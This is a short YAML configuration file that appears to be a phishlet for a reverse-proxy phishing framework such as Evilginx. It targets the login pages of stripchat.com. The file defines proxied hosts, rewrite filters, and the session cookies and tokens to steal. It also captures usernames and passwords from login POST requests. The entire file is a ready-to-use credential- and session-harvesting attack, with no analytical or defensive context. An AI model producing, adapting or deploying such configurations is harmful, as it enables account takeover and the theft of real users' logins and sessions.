author: '@cwaizydee'
min_ver: '2.3.0'
proxy_hosts:
  - {phish_sub: 'sv', orig_sub: 'sv', domain: 'stripchat.com', session: true, is_landing: true, auto_filter: true}
  - {phish_sub: 'sv', orig_sub: 'sv', domain: 'stripchat.com', session: true, is_landing: false}
  
sub_filters:
  - {triggers_on: 'sv.stripchat.com', orig_sub: 'sv', domain: 'live.com', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'application/json', 'application/x-javascript']}
  - {triggers_on: 'sv.stripchat.com', orig_sub: 'sv', domain: 'live.com', search: '''{domain}'';', replace: '''{domain}'';', mimes: ['text/html', 'application/json', 'application/x-javascript']}


auth_tokens:
  - domain: 'sv.stripchat.com'
    keys: ['uniq','fingerprint','csrfToken','token','.*,regexp']
    
auth_urls:
  - '/'
  - '/*'  
  - '/auth'
  - '/login'
  - '/auth/login'
  - '/auth/*'

credentials:
  username:
    key: 'loginOrEmail'
    search: '(.*)'
    type: 'post'
  password:
    key: 'password'
    search: '(.*)'
    type: 'post'
    
login:
  domain: 'sv.stripchat.com'
  path: '/login'
